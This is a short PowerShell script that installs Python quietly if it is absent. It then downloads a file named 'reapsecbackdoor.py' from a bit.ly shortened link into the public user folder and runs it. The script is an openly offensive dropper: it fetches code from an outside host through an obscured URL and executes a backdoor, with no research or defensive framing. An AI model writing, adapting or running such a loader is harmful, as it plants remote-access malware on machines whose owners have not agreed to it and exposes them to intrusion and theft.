# installs python if you dont have it already. 
$pythonInstalled = Get-Command python -ErrorAction SilentlyContinue

if (-not $pythonInstalled) {
    Write-Host "Python not found. Installing Python..."
    Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.9.6/python-3.9.6-amd64.exe" -OutFile "$env:TEMP\python-installer.exe"
    Start-Process "$env:TEMP\python-installer.exe" -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -Wait
}

Write-Host "Downloading backdoor script..."
Invoke-WebRequest -Uri "https://bit.ly/3AhVHLp" -OutFile "C:\Users\Public\reapsecbackdoor.py"

Write-Host "Running backdoor script..."
Start-Process "python" -ArgumentList "C:\Users\Public\reapsecbackdoor.py"
